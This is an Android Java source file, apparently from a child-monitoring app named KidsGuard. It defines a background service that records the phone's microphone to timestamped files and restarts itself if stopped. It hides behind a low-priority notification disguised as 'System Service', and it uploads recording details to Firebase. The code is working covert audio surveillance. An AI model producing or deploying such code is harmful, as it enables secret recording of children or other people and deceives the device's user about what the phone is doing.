package com.kidsguard.child;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class RecordingService extends Service {

    private MediaRecorder recorder;
    private String outputPath;
    private boolean isRecording = false;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundNotification();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startRecording();
        return START_STICKY;
    }

    private void startForegroundNotification() {
        String channelId = "recording_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "Recording", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
        }

        builder.setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_btn_speak_now);

        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(2, builder.build(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(2, builder.build(), android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE);
            } else {
                startForeground(2, builder.build());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startRecording() {
        if (isRecording) return;
        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault())
                    .format(new Date());
            File dir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            if (dir != null && !dir.exists()) dir.mkdirs();
            File file = new File(dir, "rec_" + timeStamp + ".m4a");
            outputPath = file.getAbsolutePath();

            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(44100);
            recorder.setAudioEncodingBitRate(128000);
            recorder.setOutputFile(outputPath);
            recorder.prepare();
            recorder.start();
            isRecording = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopRecording() {
        if (!isRecording || recorder == null) return;
        try {
            recorder.stop();
            recorder.release();
            recorder = null;
            isRecording = false;

            // Upload recording info to Firebase
            String devId = LocationService.getSafeDeviceId(this);
            String timeStr = new SimpleDateFormat("HH:mm dd/MM", Locale.getDefault())
                    .format(new Date());
            String data = "{\"file\":\"" + outputPath + "\",\"time\":\"" + timeStr + "\"}";
            FirebaseHelper.put("devices/" + devId + "/recordings/" + System.currentTimeMillis() + ".json", data);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        stopRecording();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
